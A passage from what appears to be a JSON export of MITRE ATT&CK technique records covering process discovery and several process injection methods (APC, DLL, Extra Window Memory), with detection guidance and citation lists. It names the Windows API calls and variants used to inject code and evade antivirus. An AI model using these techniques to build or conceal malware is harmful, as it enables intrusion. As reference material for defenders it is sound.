Boot),(Citation: Cisco IOS Software Integrity Assurance - Change Control),(Citation: Cisco IOS Software Integrity Assurance - Image File Verification)"}
{"ID":"T1057","name":"Process Discovery","description":"Adversaries may attempt to get information about running processes on a system. Information obtained could be used to gain an understanding of common software/applications running on systems within the network. Adversaries may use the information from [Process Discovery](https://attack.mitre.org/techniques/T1057) during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.\n\nIn Windows environments, adversaries could obtain details on running processes using the [Tasklist](https://attack.mitre.org/software/S0057) utility via [cmd](https://attack.mitre.org/software/S0106) or <code>Get-Process</code> via [PowerShell](https://attack.mitre.org/techniques/T1059/001). Information about processes can also be extracted from the output of [Native API](https://attack.mitre.org/techniques/T1106) calls such as <code>CreateToolhelp32Snapshot</code>. In Mac and Linux, this is accomplished with the <code>ps</code> command. Adversaries may also opt to enumerate processes via /proc.\n\nOn network devices, [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `show processes` can be used to display current running processes.(Citation: US-CERT-TA18-106A)(Citation: show_processes_cisco_cmd)","url":"https://attack.mitre.org/techniques/T1057","created":"31 May 2017","last modified":"12 April 2023","version":"1.3","tactics":"Discovery","detection":"System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Lateral Movement, based on the information obtained.\n\nNormal, benign system and network events that look like process discovery may be uncommon, depending on the environment and how they are used. Monitor processes and command-line arguments for actions that could be taken to gather system and network information. Remote access tools with built-in features may interact directly with the Windows API to gather information. Information may also be acquired through Windows system management tools such as [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) and [PowerShell](https://attack.mitre.org/techniques/T1059/001).\n\nFor network infrastructure devices, collect AAA logging to monitor for `show` commands being run by non-standard users from non-standard locations.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, Process: OS API Execution, Process: Process Creation","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Austin Clark, @c2defense","permissions required":null,"supports remote":null,"system requirements":"Administrator, SYSTEM may provide better process ownership details","impact type":null,"effective permissions":null,"relationship citations":"(Citation: XAgentOSX 2017),(Citation: Trusteer Carberp October 2010),(Citation: Mandiant APT1),(Citation: AlienVault Sykipot 2011),(Citation: Palo Alto Comnie),(Citation: Proofpoint Azorult July 2018),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Trend Micro DRBControl February 2020),(Citation: CyberBit Dtrack),(Citation: TrendMicro macOS Dacls May 2020),(Citation: Volexity InkySquid BLUELIGHT August 2021),(Citation: FoxIT Wocao December 2019),(Citation: Unit42 BabyShark Feb 2019),(Citation: Aqua Kinsing April 2020),(Citation: Securelist MuddyWater Oct 2018),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: ATT Sidewinder January 2021),(Citation: ESET InvisiMole June 2018),(Citation: NCCGroup RokRat Nov 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Kaspersky Cloud Atlas August 2019),(Citation: Fysbis Dr Web Analysis),(Citation: Kaspersky Transparent Tribe August 2020),(Citation: ESET Grandoreiro April 2020),(Citation: Trustwave Pillowmint June 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: Antiy CERT Ramsay April 2020),(Citation: Korean FSI TA505 2020),(Citation: Kaspersky Andariel Ransomware June 2021),(Citation: Mandiant Operation Ke3chang November 2014),(Citation: Palo Alto CVE-2015-3113 July 2015),(Citation: FireEye APT17),(Citation: Threatpost Lizar May 2021),(Citation: ESET Zebrocy Nov 2018),(Citation: SentinelLabs reversing run-only applescripts 2021),(Citation: NCSC Cyclops Blink February 2022),(Citation: F-Secure BlackEnergy 2014),(Citation: objsee mac malware 2017),(Citation: Unit 42 Kazuar May 2017),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: Github PowerShell Empire),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Kaspersky Poseidon Group),(Citation: Unit 42 Tropic Trooper Nov 2016),(Citation: Fortinet Agent Tesla June 2017),(Citation: Unit 42 DarkHydrus July 2018),(Citation: wardle evilquest parti),(Citation: Anomali Rocke March 2019),(Citation: FireEye APT37 Feb 2018),(Citation: Unit42 Cannon Nov 2018),(Citation: FireEye APT34 Dec 2017),(Citation: McAfee GhostSecret),(Citation: Secure List Bad Rabbit),(Citation: Industroyer2 Mandiant April 2022),(Citation: Talos Promethium June 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: ESET Sednit Part 2),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: NTT Security Flagpro new December 2021),(Citation: Talos NavRAT May 2018),(Citation: Profero APT27 December 2020),(Citation: Palo Alto Brute Ratel July 2022),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: JPCert TSCookie March 2018),(Citation: Securelist Darkhotel Aug 2015),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: Mandiant APT1 Appendix),(Citation: Zscaler Kasidet),(Citation: Palo Alto Networks BBSRAT),(Citation: Symantec Hydraq Jan 2010),(Citation: Talos ROKRAT),(Citation: TrendMicro POWERSTATS V3 June 2019),(Citation: McAfee Gold Dragon),(Citation: Secureworks Karagany July 2019),(Citation: Malwarebytes IssacWiper CaddyWiper March 2022 ),(Citation: Cisco Talos Intelligence Group),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Symantec Orangeworm April 2018),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: RATANKBA),(Citation: Proofpoint TA505 October 2019),(Citation: CrowdStrike Ryuk January 2019),(Citation: TrendMicro BlackTech June 2017),(Citation: McAfee Oceansalt Oct 2018),(Citation: ASEC Emotet 2017),(Citation: Cybereason Valak May 2020),(Citation: FOX-IT May 2016 Mofang),(Citation: McAfee Honeybee),(Citation: Unit 42 Gamaredon February 2022),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: TrendMicro Patchwork Dec 2017),(Citation: Palo Alto MoonWind March 2017),(Citation: ESET Sednit Part 1),(Citation: Rancor Unit42 June 2018),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Alperovitch 2014),(Citation: FireEye NETWIRE March 2019),(Citation: Sogeti CERT ESEC Babuk March 2021),(Citation: Symantec Dragonfly),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: ESET Machete July 2019),(Citation: Talos Kimsuky Nov 2021),(Citation: CISA SoreFang July 2016),(Citation: FireEye APT30),(Citation: Unit42 Sofacy Dec 2018),(Citation: FireEye FIN7 April 2017),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: CIRCL PlugX March 2013),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Accenture SNAKEMACKEREL Nov 2018),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Trend Micro Tick November 2019),(Citation: Malwarebytes AvosLocker Jul 2021),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: CarbonBlack Conti July 2020),(Citation: Symantec Trojan.Hydraq Jan 2010),(Citation: GitHub PowerSploit May 2012),(Citation: FireEye Ransomware Feb 2020),(Citation: Symantec Shuckworm January 2022),(Citation: Medium Ali Salem Bumblebee April 2022),(Citation: Symantec Bumblebee June 2022),(Citation: Arxiv Avaddon Feb 2021),(Citation: Lazarus APT January 2022),(Citation: Avira Mustang Panda January 2020),(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022),(Citation: ESET BlackEnergy Jan 2016),(Citation: FireEye EPS Awakens Part 2),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: McAfee Babuk February 2021),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gelsemium June 2021),(Citation: Scarlet Mimic Jan 2016),(Citation: Symantec Pasam May 2012),(Citation: Microsoft FinFisher March 2018),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: CrowdStrike Putter Panda),(Citation: Kaspersky Winnti April 2013),(Citation: ESET Dukes October 2019),(Citation: Microsoft Deep Dive Solorigate January 2021),(Citation: Volexity SolarWinds),(Citation: Unit 42 Nokki Oct 2018),(Citation: ESET Carbon Mar 2017),(Citation: TrendMicro BKDR_URSNIF.SM),(Citation: Trend Micro IXESHE 2012),(Citation: Talos Oblique RAT March 2021),(Citation: CheckPoint Naikon May 2020),(Citation: Unit 42 CARROTBAT January 2020),(Citation: Volexity PowerDuke November 2016),(Citation: TrendMicro EarthLusca 2022),(Citation: Fortinet Diavol July 2021),(Citation: Malwarebytes Konni Aug 2021),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: Accenture Dragonfish Jan 2018),(Citation: Symantec Volgmer Aug 2014),(Citation: NCC Group APT15 Alive and Strong),(Citation: Microsoft Tasklist),(Citation: McAfee Sharpshooter December 2018),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: Palo Alto menuPass Feb 2017),(Citation: FireEye Hacking Team),(Citation: ESET LoudMiner June 2019),(Citation: CISA AR21-126A FIVEHANDS May 2021),(Citation: Intezer Doki July 20),(Citation: ESET GreyEnergy Oct 2018),(Citation: Proofpoint Leviathan Oct 2017),(Citation: Novetta Blockbuster Loaders),(Citation: IBM Ransomware Trends September 2020),(Citation: Trend Micro TeamTNT),(Citation: McAfee Cuba April 2021),(Citation: Securelist BlackEnergy Nov 2014),(Citation: Lazarus RATANKBA),(Citation: FireEye Clandestine Fox),(Citation: Rapid7 HAFNIUM Mar 2021),(Citation: Mcafee Clop Aug 2019),(Citation: ATT QakBot April 2021),(Citation: Fidelis Turbo),(Citation: evolution of pirpi),(Citation: Trend Micro Waterbear December 2019),(Citation: Trend Micro KillDisk 2),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: TrendMicro Ursnif Mar 2015),(Citation: Kaspersky Lyceum October 2021),(Citation: ESET ForSSHe December 2018),(Citation: Bitdefender Trickbot March 2020),(Citation: Talos Group123),(Citation: Talos ZxShell Oct 2014),(Citation: Kaspersky TajMahal April 2019),(Citation: Symantec W32.Duqu),(Citation: FinFisher Citation),(Citation: Sofacy Komplex Trojan),(Citation: ClearSky MuddyWater June 2019),(Citation: Kaspersky CactusPete Aug 2020),(Citation: ESET Zebrocy May 2019),(Citation: ASERT Donot March 2018),(Citation: GDATA Zeus Panda June 2017),(Citation: Kaspersky Turla),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: Unit 42 VERMIN Jan 2018),(Citation: FireEye Periscope March 2018),(Citation: Securelist Dtrack),(Citation: Symantec Inception Framework March 2018),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Cylance Shell Crew Feb 2017),(Citation: Cybereason Cobalt Kitty 2017),(Citation: ESET Turla PowerShell May 2019),(Citation: Malwarebytes Kimsuky June 2021),(Citation: Microsoft PLATINUM April 2016),(Citation: Novetta Winnti April 2015),(Citation: NCC Group Chimera January 2021),(Citation: Donut Github),(Citation: SecureList SynAck Doppelgänging May 2018),(Citation: Cyphort EvilBunny Dec 2014),(Citation: Symantec Frutas Feb 2013),(Citation: Medium Metamorfo Apr 2020),(Citation: Cybereason Astaroth Feb 2019),(Citation: GitHub Pupy),(Citation: Talos GravityRAT),(Citation: Cisco Talos Bitter Bangladesh May 2022),(Citation: Kaspersky Turla Aug 2014),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Skidmap),(Citation: Novetta-Axiom),(Citation: Symantec Linfo May 2012),(Citation: McAfee Bankshot),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: Unit 42 Playbook Dec 2017),(Citation: McAfee Maze March 2020),(Citation: Cybereason Royal December 2022),(Citation: Imminent Unit42 Dec2019),(Citation: BlackBerry Bahamut),(Citation: Cybereason Bazar July 2020),(Citation: Check Point APT35 CharmPower January 2022),(Citation: Kaspersky MoleRATs April 2019),(Citation: HP SVCReady Jun 2022),(Citation: Medium KONNI Jan 2020),(Citation: BlackBerry CostaRicto November 2020),(Citation: BiZone Lizar May 2021),(Citation: ClearSky Lazarus Aug 2020),(Citation: ESET Turla Mosquito Jan 2018),(Citation: PowerSploit Documentation),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: ESET Trickbot Oct 2020),(Citation: Unit 42 Magic Hound Feb 2017),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: MacKeeper Bundlore Apr 2019),(Citation: Dragos EKANS),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET RTM Feb 2017),(Citation: MSTIC FoggyWeb September 2021),(Citation: F-Secure The Dukes),(Citation: SentinelOne FrameworkPOS September 2019),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: ESET DazzleSpy Jan 2022),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: DustySky),(Citation: Kaspersky Lab SynAck May 2018),(Citation: cobaltstrike manual),(Citation: FireEye APT38 Oct 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: Check Point Meteor Aug 2021),(Citation: Talos PoetRAT April 2020),(Citation: Securelist Brazilian Banking Malware July 2020),(Citation: Unit42 Azorult Nov 2018),(Citation: Trend Micro njRAT 2018),(Citation: Malwarebytes DarkComet March 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: FireEye CARBANAK June 2017),(Citation: FireEye FiveHands April 2021),(Citation: CrowdStrike SUNSPOT Implant January 2021),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),(Citation: Trend Micro Ransomware February 2021),"}
{"ID":"T1055","name":"Process Injection","description":"Adversaries may inject code into processes in order to evade process-based defenses as well as possibly elevate privileges. Process injection is a method of executing arbitrary code in the address space of a separate live process. Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via process injection may also evade detection from security products since the execution is masked under a legitimate process. \n\nThere are many different ways to inject code into a process, many of which abuse legitimate functionalities. These implementations exist for every major OS but are typically platform specific. \n\nMore sophisticated samples may perform multiple process injections to segment modules and further evade detection, utilizing named pipes or other inter-process communication (IPC) mechanisms as a communication channel. ","url":"https://attack.mitre.org/techniques/T1055","created":"31 May 2017","last modified":"30 March 2023","version":"1.3","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code>, <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017) \n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nMonitoring for Linux specific calls such as the ptrace system call should not generate large amounts of data due to their specialized nature, and can be a very effective method to detect some of the common process injection methods.(Citation: ArtOfMemoryForensics)  (Citation: GNU Acct)  (Citation: RHEL auditd)  (Citation: Chokepoint preload rootkits) \n\nMonitor for named pipe creation and connection events (Event IDs 17 and 18) for possible indicators of infected processes with external modules.(Citation: Microsoft Sysmon v6 May 2017) \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Linux, Windows, macOS","data sources":"File: File Metadata, File: File Modification, Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Anti-virus, Application control","contributors":"Anastasios Pingios; Christiaan Beek, @ChristiaanBeek; Ryan Becwar","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET Turla PowerShell May 2019),(Citation: Microsoft PLATINUM April 2016),(Citation: Kroll Qakbot June 2020),(Citation: Donut Github),(Citation: Symantec Wiarp May 2012),(Citation: Cybereason Bumblebee August 2022),(Citation: CrowdStrike Ryuk January 2019),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: JPCert BlackTech Malware September 2019),(Citation: Group IB Silence Sept 2018),(Citation: TrendMicro Lazarus Nov 2018),(Citation: Trend Micro DRBControl February 2020),(Citation: Fortinet Remcos Feb 2017),(Citation: Securelist WhiteBear Aug 2017),(Citation: FoxIT Wocao December 2019),(Citation: ESET InvisiMole June 2020),(Citation: Trend Micro Qakbot December 2020),(Citation: Kaspersky QakBot September 2021),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Cyble Egregor Oct 2020),(Citation: DFIR Conti Bazar Nov 2021),(Citation: Malwarebytes Dyreza November 2015),(Citation: Cybereason Bazar July 2020),(Citation: Symantec Dragonfly),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: Unit42 Emissary Panda May 2019),(Citation: FireEye APT41 Aug 2019),(Citation: Threatpost New Op Sharpshooter Data March 2019),(Citation: F-Secure Sofacy 2015),(Citation: BlackBerry CostaRicto November 2020),(Citation: BiZone Lizar May 2021),(Citation: SentinelLabs Agent Tesla Aug 2020),(Citation: Trend Micro Waterbear December 2019),(Citation: Red Canary NETWIRE January 2020),(Citation: Gh0stRAT ATT March 2019),(Citation: Unit 42 Sofacy Feb 2018),(Citation: Check Point Warzone Feb 2020),(Citation: Trend Micro Tick November 2019),(Citation: Talos Smoke Loader July 2018),(Citation: GitHub PoshC2),(Citation: Github PowerShell Empire),(Citation: Medium Eli Salem GuLoader April 2021),(Citation: Talos Group123),(Citation: NCSC Joint Report Public Tools),(Citation: GitHub Sliver C2),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky StoneDrill 2017),(Citation: Gigamon Berserk Bear October 2021),(Citation: McAfee REvil October 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Joe Sec Trickbot),(Citation: Group IB Cobalt Aug 2017),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: ESET Gazer Aug 2017),(Citation: CISA MAR SLOTHFULMEDIA October 2020),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: GitHub SILENTTRINITY Modules July 2019),(Citation: Securelist Kimsuky Sept 2013),(Citation: cobaltstrike manual),(Citation: US-CERT HOPLIGHT Apr 2019),(Citation: Cylance Dust Storm),(Citation: Bishop Fox Sliver Framework August 2019),(Citation: Trend Micro Qakbot May 2020),(Citation: Microsoft SIR Vol 21),(Citation: Talos NavRAT May 2018),(Citation: Malwarebytes RokRAT VBA January 2021),(Citation: Trend Micro Iron Tiger April 2021),(Citation: SentinelLabs Metador Sept 2022),(Citation: Trend Micro Black Basta October 2022),(Citation: Cybereason Cobalt Kitty 2017),(Citation: win10_asr)"}
{"ID":"T1055.004","name":"Process Injection: Asynchronous Procedure Call","description":"Adversaries may inject malicious code into processes via the asynchronous procedure call (APC) queue in order to evade process-based defenses as well as possibly elevate privileges. APC injection is a method of executing arbitrary code in the address space of a separate live process. \n\nAPC injection is commonly performed by attaching malicious code to the APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are executed when the thread enters an alterable state.(Citation: Microsoft APC) A handle to an existing victim process is first created with native Windows API calls such as <code>OpenThread</code>. At this point <code>QueueUserAPC</code> can be used to invoke a function (such as <code>LoadLibrayA</code> pointing to a malicious DLL). \n\nA variation of APC injection, dubbed \"Early Bird injection\", involves creating a suspended process in which malicious code can be written and executed before the process' entry point (and potentially subsequent anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018) AtomBombing (Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke malicious code previously written to the global atom table.(Citation: Microsoft Atom Table)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via APC injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/004","created":"14 January 2020","last modified":"18 October 2021","version":"1.1","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>SuspendThread</code>/<code>SetThreadContext</code>/<code>ResumeThread</code>, <code>QueueUserAPC</code>/<code>NtQueueApcThread</code>, and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Process: OS API Execution, Process: Process Access, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Saint Bot April 2021),(Citation: Trustwave Pillowmint June 2020),(Citation: CyberBit Early Bird Apr 2018),(Citation: Bitdefender FIN8 July 2021),(Citation: IBM IcedID November 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: Prevx Carberp March 2011),(Citation: ESET Attor Oct 2019),(Citation: ESET InvisiMole June 2020),"}
{"ID":"T1055.001","name":"Process Injection: Dynamic-link Library Injection","description":"Adversaries may inject dynamic-link libraries (DLLs) into processes in order to evade process-based defenses as well as possibly elevate privileges. DLL injection is a method of executing arbitrary code in the address space of a separate live process.  \n\nDLL injection is commonly performed by writing the path to a DLL in the virtual address space of the target process before loading the DLL by invoking a new thread. The write can be performed with native Windows API calls such as <code>VirtualAllocEx</code> and <code>WriteProcessMemory</code>, then invoked with <code>CreateRemoteThread</code> (which calls the <code>LoadLibrary</code> API responsible for loading the DLL). (Citation: Elastic Process Injection July 2017) \n\nVariations of this method such as reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map DLL when writing into process) overcome the address relocation issue as well as the additional APIs to invoke execution (since these methods load and execute the files in memory by manually preforming the function of <code>LoadLibrary</code>).(Citation: Elastic HuntingNMemory June 2017)(Citation: Elastic Process Injection July 2017) \n\nAnother variation of this method, often referred to as Module Stomping/Overloading or DLL Hollowing, may be leveraged to conceal injected code within a process. This method involves loading a legitimate DLL into a remote process then manually overwriting the module's <code>AddressOfEntryPoint</code> before starting a new thread in the target process.(Citation: Module Stomping for Shellcode Injection) This variation allows attackers to hide malicious injected code by potentially backing its execution with a legitimate DLL file on disk.(Citation: Hiding Malicious Code with Module Stomping) \n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via DLL injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/001","created":"14 January 2020","last modified":"18 October 2022","version":"1.2","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitoring Windows API calls indicative of the various types of code injection may generate a significant amount of data and may not be directly useful for defense unless collected under specific circumstances for known bad sequences of calls, since benign use of API functions may be common and difficult to distinguish from malicious behavior. Windows API calls such as <code>CreateRemoteThread</code> and those that can be used to modify memory within another process, such as <code>VirtualAllocEx</code>/<code>WriteProcessMemory</code>, may be used for this technique.(Citation: Elastic Process Injection July 2017)\n\nMonitor DLL/PE file events, specifically creation of these binary files as well as the loading of DLLs into processes. Look for DLLs that are not recognized or not normally loaded into a process. \n\nAnalyze process behavior to determine if a process is performing actions it usually does not, such as opening network connections, reading files, or other suspicious actions that could relate to post-compromise behavior. ","platforms":"Windows","data sources":"Module: Module Load, Process: OS API Execution, Process: Process Access, Process: Process Metadata, Process: Process Modification","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":"Boominathan Sundaram","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: AlienVault Sykipot 2011),(Citation: Accenture Dragonfish Jan 2018),(Citation: ESET Sednit Part 3),(Citation: DFIR Ryuk 2 Hour Speed Run November 2020),(Citation: Secureworks DarkTortilla Aug 2022),(Citation: Lotus Blossom Dec 2015),(Citation: Medium Metamorfo Apr 2020),(Citation: ESET PipeMon May 2020),(Citation: RATANKBA),(Citation: Kaspersky ProjectSauron Technical Analysis),(Citation: Picus Emotet Dec 2018),(Citation: Trend Micro Banking Malware Jan 2019),(Citation: Proofpoint TA505 October 2019),(Citation: FireEye Poison Ivy),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: IBM TA505 April 2020),(Citation: Github Rapid7 Meterpreter Elevate),(Citation: Airbus Derusbi 2015),(Citation: Lazarus RATANKBA),(Citation: McAfee Maze March 2020),(Citation: TrendMicro Patchwork Dec 2017),(Citation: TrendMicro Taidoor),(Citation: ESET Carberp March 2012),(Citation: Symantec Darkmoon Aug 2005),(Citation: CopyKittens Nov 2015),(Citation: DFIR Conti Bazar Nov 2021),(Citation: US-CERT Emotet Jul 2018),(Citation: Talos Cobalt Strike September 2020),(Citation: Unit 42 IronNetInjector February 2021 ),(Citation: BlackBerry CostaRicto November 2020),(Citation: BiZone Lizar May 2021),(Citation: Malwarebytes Saint Bot April 2021),(Citation: Kaspersky ShadowPad Aug 2017),(Citation: F-Secure BlackEnergy 2014),(Citation: Unit 42 Kazuar May 2017),(Citation: PowerSploit Documentation),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: CarbonBlack Conti July 2020),(Citation: GitHub PowerSploit May 2012),(Citation: Camba RARSTONE),(Citation: Talos ZxShell Oct 2014),(Citation: Symantec W32.Duqu),(Citation: Symantec Bumblebee June 2022),(Citation: ESET ComRAT May 2020),(Citation: Lazarus APT January 2022),(Citation: FinFisher Citation),(Citation: ESET Turla Mosquito May 2018),(Citation: Github Koadic),(Citation: Kaspersky TajMahal April 2019),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: Accenture MUDCARP March 2019),(Citation: ESET Gelsemium June 2021),(Citation: Eset Ramsay May 2020),(Citation: IBM MegaCortex),(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: Microsoft FinFisher March 2018),(Citation: CISA ComRAT Oct 2020),(Citation: Sophos Maze VM September 2020),(Citation: DHS/CISA Ransomware Targeting Healthcare October 2020),(Citation: ESET BackdoorDiplomacy Jun 2021),(Citation: CrowdStrike Putter Panda),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: ESET Carbon Mar 2017),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Cybereason Conti Jan 2021),(Citation: Symantec Dyre June 2015),(Citation: TrendMicro Netwalker May 2020),(Citation: GitHub Pupy),(Citation: CheckPoint Naikon May 2020),(Citation: Lotus Blossom Jun 2015),"}
{"ID":"T1055.011","name":"Process Injection: Extra Window Memory Injection","description":"Adversaries may inject malicious code into process via Extra Window Memory (EWM) in order to evade process-based defenses as well as possibly elevate privileges. EWM injection is a method of executing arbitrary code in the address space of a separate live process. \n\nBefore creating a window, graphical Windows-based processes must prescribe to or register a windows class, which stipulate appearance and behavior (via windows procedures, which are functions that handle input/output of data).(Citation: Microsoft Window Classes) Registration of new windows classes can include a request for up to 40 bytes of EWM to be appended to the allocated memory of each instance of that class. This EWM is intended to store data specific to that window and has specific application programming interface (API) functions to set and get its value. (Citation: Microsoft GetWindowLong function) (Citation: Microsoft SetWindowLong function)\n\nAlthough small, the EWM is large enough to store a 32-bit pointer and is often used to point to a windows procedure. Malware may possibly utilize this memory location in part of an attack chain that includes writing code to shared sections of the process’s memory, placing a pointer to the code in EWM, then invoking execution by returning execution control to the address in the process’s EWM.\n\nExecution granted through EWM injection may allow access to both the target process's memory and possibly elevated privileges. Writing payloads to shared sections also avoids the use of highly monitored API calls such as <code>WriteProcessMemory</code> and <code>CreateRemoteThread</code>.(Citation: Elastic Process Injection July 2017) More sophisticated malware samples may also potentially bypass protection mechanisms such as data execution prevention (DEP) by triggering a combination of windows procedures and other system functions that will rewrite the malicious payload inside an executable portion of the target process.  (Citation: MalwareTech Power Loader Aug 2013) (Citation: WeLiveSecurity Gapz and Redyms Mar 2013)\n\nRunning code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via EWM injection may also evade detection from security products since the execution is masked under a legitimate process. ","url":"https://attack.mitre.org/techniques/T1055/011","created":"14 January 2020","last modified":"10 November 2020","version":"1.0","tactics":"Defense Evasion, Privilege Escalation","detection":"Monitor for API calls related to enumerating and manipulating EWM such as GetWindowLong (Citation: Microsoft GetWindowLong function) and SetWindowLong (Citation: Microsoft SetWindowLong function). Malware associated with this technique have also used SendNotifyMessage (Citation: Microsoft SendNotifyMessage function) to trigger the associated window procedure and eventual malicious injection. (Citation: Elastic Process Injection July 2017)","platforms":"Windows","data sources":"Process: OS API Execution","is sub-technique":true,"sub-technique of":"T1055","defenses bypassed":"Anti-virus, Application control","contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: WeLiveSecurity Gapz and Redyms Mar 2013),(Citation: ESET Recon Snake Nest),(Citation: MalwareTech Power Loader Aug 2013),"}
